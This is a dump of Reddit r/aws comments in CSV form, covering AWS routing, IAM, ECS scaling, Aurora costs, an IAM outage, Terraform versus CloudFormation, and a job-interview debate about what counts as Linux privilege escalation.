g5nlnqk,iufnk5,Yes. I see it in 1 of my accounts out of 20. So not even region based.,1.0
g5k9i58,iue6xt,"If you want to use an SSL certificate with that domain then you will need to use Cloudfront and Certificate Manager to set this up.

You can map a non Route 53 subdomain to Cloudfront, so [www.example.com](https://www.example.com) will work, but not [example.com](https://example.com). This is because you will need to use a CName record. 

If you want the domain apex to go to Cloudfront, then you must use Route53 and an Alias record type.",2.0
g5kalbh,iue6xt,"&gt;J

Just for test purposes I've created a S3 with the name [www.example.n](https://www.example.com/)l (other name) which can be accessed with the s3 endpoint name.

Created a hosted zone with the same name as a A record where I was able to select the S3 name from the dropdown menu and selected simply routing as well.

According to the documentation I've read it should be possible????",1.0
g5k9zee,iue6xt,A bit of lateral thinking: if your use case allows it you could use redirects from your server to s3.,1.0
g5m06mu,iue6xt,"You will need to create a hosted zone with subdomain,  register in owners dns NS record with that subdomain to your hosted zone route53 servers, add A record in your subdomain to your s3 public address . In short it looks like fukin chain of redirects which will eventually resolve yo your s3. Off course it is simplified description of what needs to be done",1.0
g5k8tlm,iue10h,"You may need to get your certificate re-issued, and reimport it to AWS - the root CA is what's expired, this was a heavily reported tech news story in May",3.0
g5oh86j,iue10h,YOU'RE MY HERO,1.0
g5jt2c4,iub9l0,"What are you  comfortably with, I've used ubuntu as a desktop for over  a decade, but i don't know that deskop matters, I love powershell for example",3.0
g5jqk6n,iuab83,"Lots of services call KMS for you, so a call that you didn't directly initiate isn't too surprising.

However... it depends on who the caller is. Does it look like an instance id, for example? You haven't given a lot of clues here.",2.0
g5jzju5,iuab83,"Thanks for the reply. 

OK so upon looking at the status check logs it looks like there was a status check failure at the same time when all of this happened. So I assume it was a normal operation conducted by aws to migrate the instance and get it up and running again.",2.0
g5kxd13,iuab83,"Stop using the root account, setup mfa for it, and create an IAM user with Administrator policy attached for you to use.",2.0
g5jqbmu,iuab83,"Probably not. Does your EC2 instance have a user data script that calls an encrypted S3 bucket? Also, create an IAM user or assume a role and stop using the root user of you can.",1.0
g5jzjkr,iuab83,"Thanks for the reply. 

OK so upon looking at the status check logs it looks like there was a status check failure at the same time when all of this happened. So I assume it was a normal operation conducted by aws to migrate the instance and get it up and running again.",2.0
g5olbeh,iuab83,"Some AWS services will make api calls on your behalf. Does the cloudtrail event include an invokedby field? Additional AWS explanation on this activity:
https://aws.amazon.com/premiumsupport/knowledge-center/cloudtrail-root-action-logs/",1.0
g5jsdb4,iuaxpl,"Capacity providers make a ton of sense here. When creating the CP, simply set your target capacity to a percentage that fits the formula based on instance type and task resource requirements. For example, if I want to ensure that I always have 20% idle cluster capacity, I will set the target capacity value to 80. Look for target capacity in the docs below for more info: 


https://docs.aws.amazon.com/cli/latest/reference/ecs/create-capacity-provider.html


https://docs.aws.amazon.com/AmazonECS/latest/developerguide/asg-capacity-providers.html#asg-capacity-providers-create-capacity-provider",3.0
g5l8u6x,iuaxpl,"Excellent, thanks! I feel like I've been overthinking this. I really would prefer to use Fargate but the image download times are just too slow.",1.0
g5jzzp4,iuaxpl,[This blog post](https://aws.amazon.com/blogs/containers/deep-dive-on-amazon-ecs-cluster-auto-scaling/) goes into detail about the algorithm capacity providers uses to scale up/down your cluster. The parameters they provide may be enough to do what you want to do fast enough... I would read that post and experiment.,2.0
g5l8uva,iuaxpl,"Excellent, thanks.",2.0
g5k08c4,iuaxpl,"You can set Target Capacity % when creating the capacity provider.

Have in mind that 100% target capacity means that all instances are running at least 1 container and in most cases you still have spare capacity - it is not 100% cluster utilization.

I would go with 100% or you will always have instances with 0 containers.

https://docs.aws.amazon.com/AmazonECS/latest/developerguide/asg-capacity-providers.html

For Target capacity %, if managed scaling is enabled, specify an integer between 1 and 100. The target capacity value is used as the target value for the CloudWatch metric used in the Amazon ECS-managed target tracking scaling policy. This target capacity value is matched on a best effort basis. For example, a value of 100 will result in the Amazon EC2 instances in your Auto Scaling group being completely utilized and any instances not running any tasks will be scaled in, but this behavior is not guaranteed at all times.",2.0
g5k2ai9,iuaxpl,Why not in Aws batch?,1.0
g5l84v6,iuaxpl,"Batch startup times are too slow and like Fargate, it does not support image caching.",1.0
g5kktdc,iuarvt,"Gotta say I wouldn't have been impressed with that example either as an interviewer.   The process is already running with an escalated previlege.  You got a shell out of it to expand the scope of what you can do but you didn't necessarily escalate the privilege of the process.

Misconfiguration? Sure.  Security vulnerability?  Sure.  Privilege escalation?  That's stretching it.

It's not a terrible example, but as an interviewer for Amazon security dept, I would have expected a more sophisticated answer.

Also you may have failed at dozen other parts of the interview without knowing it like the LPs.

source: white hat hacker since the early 90s.",20.0
g5l9s06,iuarvt,op had me Run vim with sudo,1.0
g5jop0z,iuarvt,Dont argue with an interviewer if you want the job. Be right after you get the hob.,17.0
g5jp5fb,iuarvt,That's what I did wrong,4.0
g5jpz5f,iuarvt,"I had a scenario once where I interviewed for a job and was asked to code on the white board.  The interviewer said it wouldn’t work, but refused to code it up in an IDE and try it, even though it was like 10 lines of code.  

Rather than arguing, I went home, coded it up the way I said would work, proved it worked and sent it to his boss.  

I got the job and then realized the interviewer and several others on the team were as bad on a day to day basis as he was during that interview and I was miserable.  

Moral of the story....sometimes the interviewer him/herself is a red flag of what’s to come and whether you know it or not, you just don’t want that job.

But yeah...generally speaking, don’t argue.  Not much good comes from it.",14.0
g5jzg1q,iuarvt,"100 times this. You are interviewing them as much as they are interviewing you, and that's not an exaggeration.",7.0
g5jzgzr,iuarvt,Depends. Unless it was a bar raiser you may have avoided with people you don't like.,1.0
g5jru48,iuarvt,"Situations that start with ""I was running as root"" and then did something as root are not very novel. Shelling from 'sudo vim' is especially weak.

A more meaty example would be tricking a high privilege job into running your script, or submitting a request to a website that makes it add a new power user you have access to. That is, taking the weak permissions that were assigned to you and convincing some part of the system to do something more than that for you.

Bobby Tables is an example of privilege escalation via script injection. The UI is only supposed to let you read data, but by submitting a weird username you can delete data.",9.0
g5js0sd,iuarvt,"And, yeah, don't spend a lot of time arguing with the interviewer. Just ask why your answer didn't meet their requirements.

Though it's worth mentioning that some people will deliberately say false things to see if you can stand up for yourself.",4.0
g5jorre,iuarvt,"Perhaps the interviewer was specifically expecting vertical privilege escalation examples and not horizontal. Though if that’s the case they should have said so.

And at the same time interviewers aren’t perfect and do make mistakes. Unfortunate if that was the only part that derailed the interview, but it could be that arguing with them also dissuaded them from passing it through.",7.0
g5jmyv1,iuarvt,"Can't say for certain, but I suspect he was looking for techniques that exploit and target AWS services, rather than those specific to a Linux machine.  Two of my favorite blog posts on the subject are:

[https://labs.bishopfox.com/tech-blog/privilege-escalation-in-aws](https://labs.bishopfox.com/tech-blog/privilege-escalation-in-aws)

[https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)",3.0
g5jp4q9,iuarvt,They actually were talking about Linux based privilege escalation. It was more of a Linux Security role.,3.0
g5jnsuy,iuarvt,"Maybe they wanted an AWS specific form of privilege escalation?

An example would be through CloudFormation.",3.0
g5jnzo9,iuarvt,"Nah, those were pure Linux based questions. Nothing to do with AWS services :)",3.0
g5ki5dd,iuarvt,"  
Maybe the real test was to see how you responded. Gotta always stay humble and ready to learn. Sometimes you will have stupid arguments about what is ultimately semantics.",3.0
g5kpr0f,iuarvt,Agree with /u/geeky583. This is sudo misconfiguration at best. Seasoned *nix administrators would know to use noexec in sudoers. Introducing a vulnerability to deliberately exploit it later isn't privilege escalation.,2.0
g5tvlp2,iuarvt,"&gt;Can someone please let me know where I was wrong?

Imagine a web server running as wwwroot.

**Someone finds a flaw and is able to get directory listings and download** `/etc/password`**.**  Is that Privilege Escalation? (I say no)

**Someone finds a flaw that can execute commands.** Is that Privilege Escalation? 

Well, how about a related example: **Someone sends you a PDF that exploits your PDF viewer and is able to execute commands as you.** Is that Privilege Escalation? 

Looking at the [Privilege Escalation](https://en.wikipedia.org/wiki/Privilege_escalation) wikipedia page, *every* example is about switching to a different user. The only exception is "" Jailbreak"" where the example is ""getting out of a chroot/jail"" enforced by the kernel on your user. I claim if we are not **bypassing** some limits set on the user, then technically it's not Privilege Escalation.

Your `sudo vi` example is in the same boat. You already are root, so you're not getting elevated privs.",1.0
g5lxy4m,iuarvt,"I’ve had a couple of interviews with AWS now and they have been the most pointless interviews I’ve ever had. They were with people completely unrelated to the roles and basically just asking a bunch of questions and had no ability to answer my questions trying to get more info.  I’d try and probe a little in order that I can answer the right way and they just had no idea and weren’t able to really engage. 

Expected better to be honest but my interview experience with them has been really poor.",0.0
g5j1aub,iu7lwt,"Could try an explicit deny with a not principal?

https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_notprincipal.html",1.0
g5jm7ai,iu7lwt,"NotPrincipal doesn't work well with IAM roles due to session names. Using a condition based on the aws:userId condition key with each role's ID usually works better.
https://aws.amazon.com/blogs/security/how-to-restrict-amazon-s3-bucket-access-to-a-specific-iam-role",3.0
g5jag09,iu7lwt,https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingMFADelete.html,1.0
g5izraz,iu7ab3,You need to provide more details.,4.0
g5jux34,iu7ab3,"Added to the description of the post, thanks",1.0
g5ja731,iu7ab3,What are your instance sizes? How many replicas? CPU and memory history? Savings plans and/or RIs?,3.0
g5juxjt,iu7ab3,"Added to the description of the post, thanks",1.0
g5jl5wx,iu7ab3,"What do you consider “a fortune”?  Do you have a target budget?

What size instance are you running?

What does your current load look like?",2.0
g5julki,iu7ab3,"Sure, here you go:

- Fortune is thousands of dollars to me.
 
- Using db.r5.xlarge since Aurora doesn't give too many options 

- It's for users accessing a business application. It spikes in the morning at 7am, then dips a bit, peaks in the afternoon and drops after 9.30pm. 

- Got a writer and auto-scaling multi AZ readers",1.0
g5kir5a,iu7ab3,"And how many users are we talking?  What is peak vs off peak?  What does the CPU/Mem/Disk load look like?

It sounds like you have a robust scaleable database solution. That doesn’t come cheap. 

You can try the serverless version of Aurora.",2.0
g5nkuy5,iu7ab3,"Roughly 100k daily active users on average. Writer CPU peaks at around 30% on a normal day and touches 95% for a few minutes if a client pushes something big to their entire audience.

Will give serverless a try, it looks like the solution everyone is suggesting.",1.0
g5jxf9l,iu7ab3,Would [https://www.mysql.com/cloud/](https://www.mysql.com/cloud/) be a suitable alternative?  AWS's db.r5.xlarge is a 2 core shape so an equivalent shape is $0.0467 \* 2 OCPU = $0.0934 per hour.  This compares about \~80% less than AWS's $0.48 per hour list price.  Storage is $0.04 per GB/month.  Also no data egress costs for first 10TB/month and ridiculously low afterwards compared to RDS Aurora.,2.0
g5ky2bz,iu7ab3,I'm going to guess that this solution is hosted in Oracle Cloud Infrastructure...which has a poor track record for availability.,2.0
g5jxvex,iu7ab3,Wouldn't we lose out on multi AZ and auto-scaling?,1.0
g5kya4h,iu7ab3,"Pretty sure you would and this would be a single server running MySQL.  No replication of data on the back-end, either.

You pay more for Aurora because you get a lot more.",2.0
g5kx5i1,iu7ab3,"Reserve some credits you know are being used 24/7, 44% savings over on-demand iirc",2.0
g5na3fc,iu7ab3,"Are you in control of the application?

If so, enable RDS Performance Insights and ensure that your queries are appropriately indexed, not doing dumb stuff like fetching a list of IDs then hitting the database 1000’s of time to get them one-by-one...If you can optimise here, you can drop down to r5.large/need less read replicas maybe and you save money on IO’s.

 Unless something obvious or massively over-provsioned, there isn’t a silver-bullet.
For our application we use Performance insights to ensure the hot queries are optimised and Redis to cache stuff we use a lot.

Might be worth running the numbers on Aurora Serverless too, especially if your load is quite spikey.  Although the cost per hour is higher, you can scale down during quiet times so might be a win overall. Also, you get the multi-AZ failover so you won’t need the read replicas.",2.0
g5pdu2y,iu7ab3,"It's something known that Aurora is very expensive. You need to check is you really need Aurora, RDS MySQL might be enough for you.

I would also suggest you to take a look at MySQL Database Service from the MySQL Team on OCI:

[https://media-exp1.licdn.com/dms/image/C4E22AQG2IBvNgKgdfQ/feedshare-shrink\_800-alternative/0?e=1603324800&amp;v=beta&amp;t=5vRRcrLhcMwTg85g6y5\_Vid5TQ6v\_Kd5bj\_OaGn2sho](https://media-exp1.licdn.com/dms/image/C4E22AQG2IBvNgKgdfQ/feedshare-shrink_800-alternative/0?e=1603324800&amp;v=beta&amp;t=5vRRcrLhcMwTg85g6y5_Vid5TQ6v_Kd5bj_OaGn2sho)",1.0
g5j3wh9,iu7ab3,Agree with needing more details but any reason you’re not using Aurora Serverless,1.0
g5jv26k,iu7ab3,"Added to the description of the post, thanks

We're already on Aurora and we're concerned serverless might take too much effort. We were also told serverless might be more expensive for us.",1.0
g5jh6sp,iu78yn,"what do you mean by mixed results? 

how many instances are you protecting?

are you using Cloud Connector?

is agent baked into your AMIs?",1.0
g5jvb7q,iu78yn,"Well they keep saying our agents are not updated and then they get updated later.

Protecting anywhere between 5 and 50 instances as they scale up and down.

Not using Cloud Connector.

Yes the agents are installed on our AMIs directly. We install the agents separately, not using the ready made AMIs offered by them.",1.0
g5l7pr9,iu78yn,"ok, first make sure to add your AWS accounts via cloud connectors.

if your agents are installed in your custom AMI they will be out of date if you deploy them any time after they were created. Security updates are released a few times a day. So it's normal for them to be out of date as soon as they come online.",2.0
g5jna1e,iu77au,"Whats your use case?

I set up CloudWatch dashboards for each group of related Lambdas. The dashboard shows invocation count, error count etc.

Then I added a widget to query CloudWatch logs for any lines including substrings like ""error"" or ""fail"". That leads to lots of false positives, so I have to then filter out any string like ""did not fail"".",3.0
g5jty87,iu77au,"I'm asking for CloudTrail logs, S3 access logs, and HTTP request logs. Things like security violations, usage patterns, anomalies, etc.",1.0
g5j4ihg,iu77au,"What kind of monitoring of what kind of logs?

Generically speaking, many people either use Splunk ($$$) or ELK ($).",2.0
g5jtzsy,iu77au,"My bad, I should have been more specific. I'm asking for CloudTrail logs, S3 access logs, and HTTP request logs. Things like security violations, usage patterns, anomalies, etc.",1.0
g5ju8xj,iu77au,Generally people use Splunk or ELK and setup searches and/or alerts using the tools features for compliance violations and anomalies.,2.0
g5johqm,iu77au,CloudWatch Logs if you're looking for an AWS native solution. Lots of tight integrations with AWS services. Pricing is here ($.50/GB): https://aws.amazon.com/cloudwatch/pricing/. You can use CloudWatch Logs Insights to query your structured log data (JSON) and you can configure metric filters on your logs to generate metrics from them. It does depend on your use case and where your logs are coming from. Also recommend reading this article on how AWS does logging: https://aws.amazon.com/builders-library/instrumenting-distributed-systems-for-operational-visibility/,2.0
g5iwsja,iu71oa,"Dont have the remote full screen
Do the print screen key combo, with focus on your desktop",2.0
g5iwzja,iu71oa,Solved. Thank you!,1.0
g5l59n1,iu71oa,No problem. Glad to be able to!,1.0
g5q2zlf,iu71oa,"I use snipping tool on my local computer with a delay, then open the RDP session during the delay.",1.0
g5z3mvf,iu6pai,"Don't know if you eventually figured this out, but there is a [docs page](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/distribution-overview-required-fields.html) that has the required fields for creating a distribution.",1.0
g5ispt5,iu686c,My terraform runs hang spinning on IAM fetches.,26.0
g5itna9,iu686c,Same.,7.0
g5jhpaz,iu686c,"Mine was in the middle of deploying a massive stack and died and didn’t save the state so now I have to manually go and clean it up tomorrow. Major pain.

Edit: I didn't mean for this to become a CF vs Terraform debate. People really are passionate about this. I was more just irritated that IAM went down.",7.0
g5ji5y0,iu686c,Bleh. Sorry friend; that sucks 😔,6.0
g5k9w3u,iu686c,Ouch! Sucks indeed :(,2.0
g5l0ynl,iu686c,"After using cloudformation and terraform I should say that CF is superior to TF. I don't understand all the hype. Just yesterday I discovered two bugs in TF of a kind that in never seen in CF.

With TF you also have to worry about saving state and handling use case, where multiple people can use it, passing outputs betweens tasks.

When there is an issue, by default TF just leaves you in a broken state, where CF will rollback to to last good state. Looks like you also got a bug, where it didn't saved state in failure.

TF maybe was better when it was introduced, but CF fixed all of these shortcomings that TF supposed to fix.",1.0
g5m94t4,iu686c,Shit i loved CF while taking the aws certs. Now ppl using terraform makes me have to study that too while I look to get into the cloud 😅😅,1.0
g5mbpa6,iu686c,"CF was horrible back when I first started using it, when it was JSON only and I suspect that probably was the reason TF started. But once CF added YAML it made things much better. 

They then incrementally improved things, for example the conditional statements, or CIDR calculation. I also really like exports, where I can for example export comma separated list of subnets and other values and can deploy other stacks without having to pass these values each time.",1.0
g5nz62x,iu686c,"I'm so. sick. of this comparison!! No offense to you! but they are not the same thing. CF is for AWS. TF is for... well, everything.

If you want to manage a complex deployment or platform and want to use anything other than the AWS Provider, you're going to have a hard (read: impossible) time doing that in CF.

Comparing the two like that is like saying bash is better than Python. They are similar enough to where a comparison can be made in a hand-wavey kind of way, but the relationship breaks down under scrutiny.

TLDR; Let TF be TF and let CF be CF",1.0
g5oc86b,iu686c,"I'm sick that this is being used as a selling point. Yeah TF can be used with other providers. But if you use a different provider everything changes the only thing in common is just the json-like syntax and that's it. You have completely different resources with completely different arguments and the structure is very different. Both TF files and CF files are nothing more than list of resources with parameters and references to each other.

You aren't gaining much by using the same tool to provision in different clouds and CF in AWS is far less buggy (can you imagine that until version 0.13 (which was released 2(?) months ago?) TF when destroying a stack TF was using stack on your local disk instead of what it actually deployed), you don't have to worry about saving state in a central place, or that you are using a different version than your coworker. There's no added benefit of using TF in AWS, only drawbacks.

If you use GCP, then I totally agree TF is totally better than the POS they are offering.",2.0
g5q5hpz,iu686c,"&gt; But if you use a different provider everything changes the only thing in common is just the json-like syntax and that's it.

This is actually hilarious. This IS the selling point",1.0
g5qv3li,iu686c,"It is a very weak point.

It's like assuming that if you used Prometheus you will know how to use SaltStack, because both use YAML for configuration.

A lot of people who don't know TF understand it as if they write configuration for AWS they can reuse it in other clouds, like GCP, when if you familiar with TF out is obviously not true.

The argument about having to relearn things is also flawed, the configuration in CF and TF it's basically just list of resources with properties and references between them. Those resources nap nearly map 1:1 with few exceptions where TF incorporated two components into one (for example VPC + IPv6 CIDR), which maybe wasn't a good move, since it is source of many bugs.",2.0
g5r8kd7,iu686c,"I can understand your frustration! The key point I'm making is that if you have a deployment of a product platform that consists of AWS Infrastructure, Auth0 SAML, GitLab repository configuration, Datadog monitoring, and Dome9 security scanning; there really isn't a better unified alternative that allows you to deploy all of those things, while exporting cross-product configuration and common resources.

&amp;#x200B;

I imagine there's likely no position I or anyone else could take that would make you see the value in that, but in terms of how Terraform moved the needle for what IaC as a \*concept\* represents, it really nailed it.

&amp;#x200B;

I work at a startup that deploys our entire platform (using nearly all of the services I listed above, except Auth0), some 60k lines of Terraform expertly engineered -- we haven't had any state issues in almost a year, we use dozens of layers across dozens of repositories based on component and service, hundreds of workspaces between our developers and teams, shared environments, ephemeral environments, you name it! all neatly versioned and able to be deployed in the blink of an eye -- and the level of acceleration it has given us is simply incredible. We still of course use CloudFormation for serverless stacks, however that is another tool in the toolbox. Just like Terraform is!

&amp;#x200B;

All of these tools have their place, and from a professional development standpoint, I personally think it's a bad pattern to develop that kind of tribalism that so pervades our field. Having a clear understanding of the shortcomings of a tool puts you in a better place to make decisions that can provide value to your team and product, but it seems like your perception of the shortcomings of Terraform are based entirely around what kinds of hangups a given person could have when working across multiple Providers; and that my friend is a people problem, not a product problem.

&amp;#x200B;

And it's very easily solved by simple experience. Those are issues that a Junior engineer would face in maybe their first year of working with Terraform, but for anyone who is using Terraform in a capacity where it really shines, those issues will have long been overcome. I would liken it to saying racecar drivers shouldn't use manual cars because shifting gears can be confusing and different racecars have different shift parameters.",1.0
g5oe9ct,iu686c,"That's funny because I feel the opposite about CF. I feel like TF is way better. I used CF for a few years before recently moving to TF. 

I also think the syntax for writing Cloudformation is much less powerful than Terraform. The way you build strings in CF is a mess. But I'm probably a bit extreme for how I'm using Terraform. My current Terraform stack consists of 160 resources that get created (ECS, Lambda, VPC, Load Balancers, EIP...).",1.0
g5qtduz,iu686c,"If it works for you it works for you. Perhaps TF allows something I can't do in CF, but I'm unaware of it (ignoring the obvious of using a different provider). There are many shortcomings though and while I can understand them, the bugs that I hit should be only in initial versions not after years of its existence.",1.0
g5itrfs,iu686c,same.,5.0
g5jins9,iu686c,I reckon this could have started or happened yesterday (15 ish hours ago) as well - terraform randomly hanging for me and some others on my team but not everyone.,2.0
g5ix0al,iu686c,Seeing the same. Does this qualify for SLA violation credits?,19.0
g5jp66y,iu686c,most certainly not. check the definition of unavailable on aws SLA.,2.0
g5jtkqh,iu686c,"I don't get it, isn't this exactly the kind of thing the SLA Violation Credit is meant for? But also I'm not able to find the SLA for IAM.",12.0
g5kax5e,iu686c,There is none.,10.0
g5kv1az,iu686c,"There isn't an SLA for IAM,  but if it is another service that you use being affected and covered by SLA, then it qualifies for credit. But keep in mind that the unavailability is not calculated universally based on how long IAM (or your AWS service) was down for, but how long you were personally impacted for. You will need to raise a request for credit via a support case demonstrating the outage on your end.

All the AWS SLAs are here: [https://aws.amazon.com/compute/sla/](https://aws.amazon.com/compute/sla/)",2.0
g5l7otn,iu686c,That is only for compute services. See: https://aws.amazon.com/legal/service-level-agreements/ for a full list with all services with an SLA.,1.0
g5iyz6e,iu686c,It's causing an outage for Doordash. Lots of money bleeding,16.0
g5jncm1,iu686c,Why is creating/updating IAM ever in the critical path of a normally operating production site?,8.0
g5jp2uk,iu686c,"It seemed to affect more than they originally said.  

* ListServerCertificates for instance broke and alb ingress controller started failing.
* Our gsuite SSO on the cli stopped working.
* Iam.amazon.com was refusing connections entirely.",11.0
g5kilz4,iu686c,"IAM is going to affect everything. If the role and policy attached to your ALB wasn’t able to use List* etc this would absolutely be the root cause, and then boom, no SSL",2.0
g5kc0gn,iu686c,We use AssumeRole all the time. Was also affected,8.0
g5iv0j5,iu686c,Our CF templates are stuck deleting IAM roles :) but it’s ok because we can point the finger upwards,10.0
g5iuix2,iu686c,I just got an AWS course on Udemy and it told me to create an account but I guess this is why I cannot create an account.,7.0
g5isqot,iu686c,"Yep, terraform is getting tcp timeouts on [iam.amazonaws.com](https://iam.amazonaws.com) :\[",11.0
g5isgr2,iu686c,Yep. IAM in console is timing out.,5.0
g5j0r4e,iu686c,Is it just me or has there has been several repeated times IAM has gone down like this lately?,9.0
g5jhz0m,iu686c,"Yeah, this is getting outrageous. I saw the same thing a couple weeks ago.",2.0
g5jc489,iu686c,"Per the SHD:

&gt;5:42 PM PDT Between 2:48 PM and 5:28 PM PDT we experienced periods of increased error rates and latencies for IAM operations impacting all AWS Regions. This issue affected mutating operations of IAM Users and Roles as well as Assume Role. Other AWS Services that performed these IAM operations were also impacted. Authentication using existing IAM users and roles was not affected. The majority of the impact was mitigated at 4:12 PM, and the issue was fully resolved at 5:28 PM. **The issue has been resolved and the service is operating normally.**",8.0
g5isnn7,iu686c,"Yeah same, console and cli",2.0
g5isyqr,iu686c,Same for us multiple accounts. Status page all green from what I'm seeing though?,2.0
g5itsny,iu686c,It's up there on status.aws.amazon.com,8.0
g5iu0lf,iu686c,status is now saying there's a problem.,3.0
g5it6nh,iu686c,Status dashboard is useless.,7.0
g5iy15i,iu686c,It is cached in cloudfront to save money,18.0
g5j11m3,iu686c,How decidedly inconvenient,5.0
g5lfrai,iu686c,Who the fuck would do that,1.0
g5lgeeh,iu686c,/s,1.0
g5lgq6v,iu686c,Whoops that one flew right over me,1.0
g5iv8be,iu686c,I was hoping to do some work this morning... never mind,1.0
g5iygd8,iu686c,I’m having issues creating TGW attachments and subscribing to EC2 marketplace AMIs. Not sure why this affected but it’s throwing API errors.,1.0
g5j4yss,iu686c,"Yeah, had major problems for a few hours.",1.0
g5jg535,iu686c,This has been resolved for us.   I saw it in IAM and Cloudformation but it's all clear now per AWS.,1.0
g5j85lo,iu686c,earlier than 3:17 PDT,-1.0
g5it0sb,iu686c,I'm getting the same,-4.0
g5it4hq,iu686c,my site is down,-4.0
g5j4b7t,iu686c,"My services are up and running, at least so my Hetzner Cloud console shows...weird...

EDIT: forgot I migrated out from AWS.",-26.0
g5lfthk,iu686c,on a thread about an AWS service on r/aws?,1.0
g5i46d5,iu2rrr,"Step can do it. I’ve found it kind of a pain to setup. Not knowing how many lambdas you are waiting on, or if you know that, but you could 
 have your lambda write out to a sqs queue and pick it up from there once all items are finished.",2.0
g5i58ju,iu2rrr,"Thanks! Would you mind sharing main ideas how to do it with step (if I decide to go on with that route).

&amp;#x200B;

The thing is that beforehand I'm going to know how many output items I'm expecting, so I might write to s3 file and count how many of them are present. However, that sounds like less than elegant solution.",2.0
g5iaun3,iu2rrr,https://aws.amazon.com/getting-started/hands-on/create-a-serverless-workflow-step-functions-lambda/,2.0
g5jgajc,iu2rrr,"I think I did something similar a while back.  We wrote a list of ids to dynamo at the start of the job, then in each sqs event we put that id, and at the end of each lambda execution, we’d remove that id from dynamo and check if we hit zero remaining.  When we hit zero, send an event to a new sqs queue to start the next process.  But I’m a AWS noob so there are probably way better ways.",2.0
g5jmz1t,iu2rrr,"I have this problem a lot. Step Functions are the simplest solution.

(The alternative is using dynamodb conditional updates as a distributed semaphor)

Note that the console doesn't cope well with Map tasks with many branches, but the backend still works fine, other that higher than expected latency for overhead. Is this going to be latency sensitive?",1.0
g5k4vok,iu2rrr,"I'm not sure about that, my map tasks would be about 5 minutes long, so I could tolerate few seconds of overhead.

&amp;#x200B;

Btw what latency are you referring to? I assume the latency to invoke all the lambdas? I saw the cool thing in one paper where they invoked a number of lambdas i.e. from SDK, but then to speed invocation they invoked other lambdas from initially invoked lambda (in tree-like fashion). This gave them considerable speedups for that.",1.0
g5mzlga,iu2rrr,"I've got one Step Function which has a map task inside a map task. Totalling 100 Lambda invocations. The total Step Function duration is a few seconds longer than I expect.

I *think* thats because step functions have a bit of overhead to invoke the Lambdas. I could be wrong though.",1.0
g873rtw,iu2rrr,"Maybe I'm a bit late, but here [https://github.com/lithops-cloud/lithops](https://github.com/lithops-cloud/lithops) you will find a tool I'm contributing to that does exactly what you need. Take a look at it!",1.0
g5hscfx,iu0pt9,"Hello! I figured that there's some quality of life additions that could be added to the console to help improve productivity. First couple of things add some keyboard shortcuts to toggle the services &amp; region dropdown, with a filter to quickly find &amp; select the region you want.

It's in no way the cleanest code, still very early, but let me know if there's anything nav bar-related that would be worth adding! With AWS removing the pinned service support in the new layout, might start looking at that.

https://github.com/Nessworthy/chrome-extension-aws-quicksearch",1.0
g5ip54w,iu0pt9,"A nice addition would be some kind of indicator of what account you're logged into. Text, color, maybe a customizable icon.",2.0
g5k3wb6,iu0v1n,"I'd simply grep only for ""image"" which would return only the image line on it.

&amp;#x200B;

For the AWS CLI style if you try to get the object in that fashion you would have to do something structural like  --query 'taskDefinition.containerDefinitions\[0\].image'",1.0
g5ifgl8,iu1hi0,"Use a VPN to connect to the VPC.

1.	AWS Client VPN
2.	OpenVPN Access Server
3.	Aviatrix
4.	IPSec tunnel from your on-prem environment 

We use #3. Aviatrix integrates with SAML SSO so we can use our corporate identity provider (AzureAD) with all of its protections (2FA, risky sign in detection, etc.).",6.0
g5k4ctu,iu1hi0,Thanks for the response. Aren't you afraid that your whole Ops team has a continuous network access to the production?,2.0
g5kld9d,iu1hi0,"The VPN is temporary, time limited, and traceable. It’s as continuous as an SSM browser session. Access to prod is limited to people who are responsible for actually fixing issues in prod. (Aviatrix lets you assign profiles to users which controls the IP ranges they can access.)

If we wanted to take it a step further. AzureAD has a temporary group membership feature we could probably use. We use it in some other places. It’s a royal pain in the ass to use though.

At the IAM/AWS console level, we have access tiers (read only, limited read/write, almost-full-admin, etc.). People in the lower tiers are similarly limited at with their database credentials. Someone with read only access to the AWS account has read only database credentials. We use Aurora PostgreSQL IAM authentication for this.",1.0
g5kpp37,iu1hi0,"1. Jump box in private subnet
2. Ssh session manager to connect to ec2 instances or jump box (for rds access)
3. Leave jump box off most the time.

Benefits:

- No vpn needed
- no external network connectivity
- All ssh commands logged/ fully auditable
- can enforce 2fa on session manager connections
- no need for user ssh key management on on ec2 boxes
- can force use of temp creds for session manager ssh
- leverages iam for user management",2.0
g5j3xt9,iu1hi0,"Vpn to environment, utilize MFA. If you want to go further, look at something like Okta Advanced Server Access.

Ultimately, this question is pretty open ended.... I would figure out what requirements are needed from a compliance perspective, then build off of that.",1.0
g5k4erf,iu1hi0,"Thanks! The question is open ended on purpose because I'm curious to see what others are doing.

Re: VPN - aren't you afraid that Ops have a continuous network access to production?",1.0
g5le57l,iu1hi0,"Nope- Session management/timeouts, MFA, etc would be in place. Being ""afraid"" of Ops doing work is this odd stigma of DevOps. You should limit access with RBAC, but Ops sometimes truly does need to poke around to find a problem. 

My guess is this is a small(ish) company?",2.0
g5ildkt,iu2bio,Is ***anything*** really free?  (Spoiler: it is not.),8.0
g5i6yn1,iu2bio,"&gt; By now, it should be starting to dawn on you that the free tier is carefully plumbed with clever traps to catch the unwary.

well, not yet. you will need to work a little harder.",5.0
g5j34mp,iu2bio,"I read this earlier in my email. As usual a very interesting read. Just want to say thanks for all the interesting articles and podcast content! 


I'm someone (relatively) new to AWS and your stuff makes the usual dry AWS theory always seem more interesting and relevant.",3.0
g5i66mu,iu2bio,"Spoiler: Author is angry that he didn't understand what a ""free tier"" was and got nailed with several hundred in fees for non-free services.  


The free tier is really free. Things not inside the free tier are not free.  


The article even cites a shmuck who put a giant file in s3 for free download, then was shocked when he had to pay for those downloads. Like, come on guys. Just because you can fuck up and end up outside the free tier by not reading the damn documentation doesn't mean the free tier isn't free.",3.0
g5igl78,iu2bio,"The author is extremely knowledgeable on this topic and provides AWS cost optimization services.

I’ve been working with AWS for years now overseeing pretty sizable production workload and several smaller environments, and I still scratch my head at the free tier when I read the pricing pages.

I’ve followed this sub for multiple years, and posts about unexpected bills on the free tier are a VERY common occurrence, which suggests he might be on to something.",14.0
g5j3lje,iu2bio,"""I still scratch my head at the free tier when I read the pricing pages""


This is the exact thing that stopped me getting my hands dirty with AWS before my work adopted it as a provider. It is unfortunately a very real barrier to entry to the platform IMO.",2.0
